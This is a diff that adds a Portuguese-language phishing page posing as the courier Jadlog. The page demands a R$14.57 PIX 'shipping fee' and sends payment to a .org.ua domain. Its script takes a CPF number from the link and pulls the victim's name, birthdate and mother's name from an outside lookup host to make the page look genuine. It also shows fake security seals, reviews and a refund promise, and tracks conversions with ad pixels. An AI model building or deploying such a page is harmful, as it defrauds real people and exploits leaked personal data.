@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>Jadlog | Última etapa para liberar seu envio</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<link rel="icon" href="https://play-lh.googleusercontent.com/sm-xI7rDNH7tNqoMynYhVACU6b0yGKQnfb1Ee7JyWV30Ko54UxoLw3X6OCHaCsvjsZlu">
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+
+  :root{
+    --red:#CB0033;
+    --red-dark:#9a0026;
+    --green:#16a34a;
+    --green-bg:#ecfdf3;
+    --amber-bg:#fffbeb;
+    --amber-border:#f59e0b;
+    --bg:#f4f6fb;
+    --text:#0f172a;
+    --muted:#64748b;
+    --border:#e2e8f0;
+  }
+
+  body{
+    font-family:'Inter',system-ui,-apple-system,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    line-height:1.55;
+    padding:14px 14px 56px;
+    min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .wrap{max-width:540px;margin:0 auto;animation:fadeUp .5s ease-out}
+  @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+
+  /* ── Barra de urgência no topo ── */
+  .urgency-bar{
+    background:linear-gradient(90deg,var(--red),var(--red-dark));
+    color:#fff;
+    text-align:center;
+    font-size:12.5px;
+    font-weight:600;
+    padding:9px 12px;
+    border-radius:12px;
+    margin-bottom:14px;
+    letter-spacing:.2px;
+    box-shadow:0 4px 14px rgba(203,0,51,.25);
+  }
+  .urgency-bar .dot{
+    display:inline-block;width:7px;height:7px;border-radius:50%;
+    background:#fff;margin-right:6px;vertical-align:middle;
+    animation:blink 1.2s ease-in-out infinite;
+  }
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+  /* ── Header ── */
+  .header{text-align:center;padding:6px 0 18px}
+  .header img{max-width:130px;margin-bottom:12px}
+  .verified-pill{
+    display:inline-flex;align-items:center;gap:6px;
+    background:var(--green-bg);color:var(--green);
+    font-size:12px;font-weight:700;
+    padding:6px 14px;border-radius:100px;border:1px solid #bbf7d0;
+  }
+
+  /* ── Cards ── */
+  .card{
+    background:#fff;border-radius:20px;padding:24px 20px;
+    box-shadow:0 6px 24px rgba(15,23,42,.06);
+    border:1px solid var(--border);
+    margin-bottom:14px;
+  }
+  .card-hero{border-color:rgba(203,0,51,.16);position:relative;overflow:hidden}
+  .card-hero::before{
+    content:"";position:absolute;top:0;left:0;right:0;height:4px;
+    background:linear-gradient(90deg,var(--red),#ff4d6d,var(--red));
+  }
+
+  .hero-icon{
+    width:62px;height:62px;border-radius:50%;
+    background:linear-gradient(135deg,var(--red),var(--red-dark));
+    display:flex;align-items:center;justify-content:center;
+    margin:0 auto 16px;
+    box-shadow:0 8px 20px rgba(203,0,51,.3);
+  }
+  .hero-icon svg{width:32px;height:32px}
+
+  h1{font-size:23px;font-weight:800;text-align:center;line-height:1.25;letter-spacing:-.4px;margin-bottom:10px}
+  h1 .highlight{color:var(--red)}
+
+  .lead{text-align:center;font-size:15px;color:var(--muted);margin-bottom:22px;line-height:1.6}
+  .lead strong{color:var(--text)}
+
+  /* ── Dados destinatário ── */
+  .data-box{
+    background:#f8fafd;border:1px solid var(--border);
+    border-radius:14px;padding:16px;margin-bottom:18px;
+  }
+  .data-label{
+    font-size:11px;font-weight:800;letter-spacing:1.2px;
+    text-transform:uppercase;color:var(--red);
+    margin-bottom:10px;display:flex;align-items:center;gap:6px;
+  }
+  .data-content{
+    font-size:14.5px;font-weight:600;background:#fff;
+    padding:14px 16px;border-radius:12px;border:1px solid var(--border);
+    line-height:1.7;word-break:break-word;
+  }
+  .data-content .row{font-weight:400;color:var(--muted);font-size:13.5px;margin-top:2px}
+  .cpf-tag{
+    display:inline-flex;align-items:center;gap:5px;
+    background:var(--green-bg);color:var(--green);
+    font-size:12px;font-weight:700;
+    padding:5px 12px;border-radius:100px;margin-top:10px;
+  }
+
+  /* ── Oferta destacada ── */
+  .offer{
+    background:linear-gradient(135deg,#fff5f7,#fff);
+    border:2px dashed var(--red);
+    border-radius:16px;
+    padding:20px 18px;
+    text-align:center;
+    margin-bottom:20px;
+  }
+  .offer .label{font-size:13px;font-weight:700;color:var(--muted);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
+  .offer .price{font-family:'Poppins',sans-serif;font-size:42px;font-weight:800;color:var(--red);line-height:1;letter-spacing:-1.5px}
+  .offer .price small{font-size:20px;font-weight:700;vertical-align:top}
+  .offer .reimburse{
+    display:inline-block;margin-top:10px;
+    background:#fff;border:1px solid #bbf7d0;
+    color:var(--green);font-size:13px;font-weight:700;
+    padding:7px 16px;border-radius:100px;
+  }
+
+  /* ── Benefícios ── */
+  .benefits{list-style:none;margin-bottom:22px}
+  .benefits li{
+    display:flex;align-items:flex-start;gap:12px;
+    padding:11px 0;font-size:14.5px;
+    border-bottom:1px solid #f1f5f9;
+  }
+  .benefits li:last-child{border-bottom:none}
+  .check{
+    flex-shrink:0;width:22px;height:22px;
+    background:var(--green-bg);color:var(--green);
+    border-radius:50%;display:flex;align-items:center;justify-content:center;
+    font-size:13px;font-weight:900;margin-top:1px;
+  }
+
+  /* ── CTA ── */
+  .cta{
+    display:block;width:100%;
+    background:linear-gradient(135deg,#e0003c,var(--red-dark));
+    color:#fff;font-family:'Poppins',sans-serif;font-weight:800;
+    font-size:18px;padding:20px 16px;border:none;border-radius:14px;
+    cursor:pointer;text-align:center;text-decoration:none;
+    box-shadow:0 12px 26px -6px rgba(203,0,51,.5);
+    transition:all .2s;letter-spacing:.2px;line-height:1.3;
+    animation:pulseBtn 2.5s ease-in-out infinite;
+  }
+  @keyframes pulseBtn{
+    0%,100%{box-shadow:0 12px 26px -6px rgba(203,0,51,.5)}
+    50%{box-shadow:0 12px 34px -2px rgba(203,0,51,.75)}
+  }
+  .cta:hover{transform:translateY(-2px);box-shadow:0 18px 32px -6px rgba(203,0,51,.65)}
+  .cta:active{transform:translateY(0)}
+  .cta-sub{display:block;font-size:12.5px;font-weight:500;opacity:.85;margin-top:4px}
+
+  .cta-note{text-align:center;font-size:12.5px;color:var(--muted);margin-top:12px;line-height:1.5}
+
+  /* ── Selos ── */
+  .seals{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:18px}
+  .seals span{
+    background:#f1f5f9;color:var(--muted);
+    font-size:12px;font-weight:600;padding:7px 13px;border-radius:100px;
+  }
+
+  /* ── Prova social ── */
+  .social-proof{text-align:center}
+  .social-proof .stars{color:#f59e0b;font-size:18px;letter-spacing:2px;margin:8px 0}
+  .social-proof p{font-size:14px;color:var(--muted)}
+  .social-proof strong{color:var(--text)}
+
+  /* ── Footer ── */
+  footer{
+    text-align:center;font-size:11.5px;color:#94a3b8;
+    margin-top:24px;padding-top:20px;border-top:1px solid rgba(0,0,0,.05);
+    line-height:1.7;
+  }
+
+  /* ── Loading ── */
+  .pulse{animation:pulse 1.4s ease-in-out infinite;color:var(--muted)}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+
+  @media(max-width:400px){
+    h1{font-size:20px}
+    .offer .price{font-size:36px}
+    .cta{font-size:16.5px;padding:18px 14px}
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <!-- Urgência no topo -->
+  <div class="urgency-bar">
+    <span class="dot"></span>
+    Seu pedido está reservado — confirme para liberar o envio hoje
+  </div>
+
+  <!-- Header -->
+  <header class="header">
+    <img src="images/jadlog-logo.png" alt="Jadlog Transporte Expresso">
+    <div class="verified-pill">⚡ Parceiro oficial • Entregas verificadas</div>
+  </header>
+
+  <!-- Card principal -->
+  <main class="card card-hero">
+
+    <div class="hero-icon">
+      <svg viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+      </svg>
+    </div>
+
+    <h1>Falta <span class="highlight">1 passo</span> para seu pedido sair para entrega</h1>
+    <p class="lead">
+      Seu produto já está <strong>separado e embalado</strong>. Confirme a taxa de envio para liberar a postagem <strong>hoje</strong>.
+    </p>
+
+    <!-- Dados do destinatário -->
+    <div class="data-box">
+      <div class="data-label">📋 Destinatário verificado</div>
+      <div id="dynamicUserData" class="data-content">
+        <span class="pulse">Carregando informações...</span>
+      </div>
+      <div class="cpf-tag">✓ CPF validado pelo sistema</div>
+    </div>
+
+    <!-- Oferta -->
+    <div class="offer">
+      <div class="label">Taxa de envio (única)</div>
+      <div class="price"><small>R$</small> 14,57</div>
+      <div class="reimburse">🔄 Reembolso integral em até 12h</div>
+    </div>
+
+    <!-- Benefícios -->
+    <ul class="benefits">
+      <li><span class="check">✓</span><span><strong>Postagem hoje</strong> — envio prioritário após a confirmação</span></li>
+      <li><span class="check">✓</span><span><strong>Rastreio em tempo real</strong> por e-mail e WhatsApp</span></li>
+      <li><span class="check">✓</span><span><strong>Reembolso total</strong> da taxa em até 12h úteis</span></li>
+      <li><span class="check">✓</span><span><strong>Garantia de 7 dias</strong> + suporte Jadlog 7 dias/semana</span></li>
+    </ul>
+
+    <!-- CTA -->
+    <a href="https://ambienteeonline.org.ua/c/d3ea24f80f"
+       id="mainActionBtn"
+       class="cta"
+       rel="noopener noreferrer">
+      Liberar envio agora — R$ 14,57
+      <span class="cta-sub">Pagamento via PIX • Aprovação imediata</span>
+    </a>
+
+    <p class="cta-note">
+      🔒 Ambiente 100% seguro • Você será redirecionado ao checkout oficial
+    </p>
+
+    <!-- Selos -->
+    <div class="seals">
+      <span>🔒 Pagamento criptografado</span>
+      <span>🔄 Reembolso garantido</span>
+      <span>⭐ 4.9/5 · +2.800 avaliações</span>
+    </div>
+
+  </main>
+
+  <!-- Prova social -->
+  <section class="card social-proof">
+    <p style="font-weight:700;font-size:15px;">📢 Clientes da sua região aprovaram</p>
+    <div class="stars">★★★★★</div>
+    <p><strong>+950 entregas</strong> concluídas nos últimos 30 dias</p>
+  </section>
+
+  <footer>
+    Jadlog Transporte e Logística • CNPJ 06.088.825/0001-00<br>
+    Protocolo de segurança e verificação de endereço
+  </footer>
+
+</div>
+
+<script>
+  (function() {
+    const params = new URLSearchParams(window.location.search);
+    const cpf = params.get('document');
+    const box = document.getElementById('dynamicUserData');
+
+    const render = (d) => {
+      const genero = { M: 'Masculino', F: 'Feminino' }[d.sex] || d.sex;
+      let html = '';
+      if (d.name) html += `<div>👤 <strong>${d.name}</strong></div>`;
+      if (d.birthdate) html += `<div class="row">📅 Nascimento: ${d.birthdate}</div>`;
+      if (genero) html += `<div class="row">⚥ Gênero: ${genero}</div>`;
+      if (d.mother && d.mother !== '0' && d.mother !== 'null') html += `<div class="row">👩 Mãe: ${d.mother}</div>`;
+      if (d.cpf) {
+        const f = d.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        html += `<div class="row" style="margin-top:6px;">🆔 CPF: ${f}</div>`;
+      }
+      box.innerHTML = html || '<span>Dados não disponíveis</span>';
+    };
+
+    if (cpf) {
+      fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + encodeURIComponent(cpf))
+        .then(r => r.json())
+        .then(d => render({ name: d.name || 'Cliente verificado', sex: d.sex || '', cpf: d.cpf || cpf, mother: d.mother || '', birthdate: d.birthdate || '' }))
+        .catch(() => render({ name: 'Cliente verificado', cpf }));
+    } else {
+      render({ name: 'Cliente preferencial', cpf: '***.xxx.**-**' });
+    }
+  })();
+
+  document.getElementById('mainActionBtn').addEventListener('click', () => {
+    try {
+      if (typeof fbq !== 'undefined') fbq('track', 'InitiateCheckout', { value: 14.57, currency: 'BRL' });
+      if (typeof kwaiq !== 'undefined' && kwaiq.event) kwaiq.event('conversion_click');
+    } catch(e) {}
+  });
+</script>
+
+<!-- Meta Pixel -->
+<script>
+  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+  n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}
+  (window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '780950984715966');
+  fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=780950984715966&ev=PageView&noscript=1"/></noscript>
+
+<!-- Kwai -->
+<script>
+  if (typeof kwaiq !== 'undefined' && kwaiq.load) {
+    kwaiq.load('288662522106320');
+    if (kwaiq.page) kwaiq.page();
+  }
+</script>
+<script src="js/utm-handler.js" data-token="7c82c281-838e-477f-8570-2edf492cddb7" data-click-id-param="click_id" async></script>
+</body>
+</html>
